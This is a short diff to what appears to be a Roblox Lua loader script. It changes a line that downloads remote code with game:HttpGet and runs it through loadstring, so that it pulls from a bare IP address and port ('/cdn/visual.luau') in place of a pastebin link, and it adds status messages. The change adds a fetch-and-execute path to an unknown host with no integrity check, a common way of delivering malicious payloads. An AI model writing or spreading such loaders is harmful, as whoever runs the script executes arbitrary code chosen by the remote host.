@@ -14,5 +14,11 @@ print("✅ Loading external script...")
 
 local success, err = pcall(function()
     -- 👇 Your actual script line goes right here:
-    loadstring(game:HttpGet("https://pastebin.com/raw/P57G9HHs"))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end)
+
+if success then
+    print("✅ External script loaded successfully!")
+else
+    warn("❌ Failed to load external script: " .. tostring(err))
+end
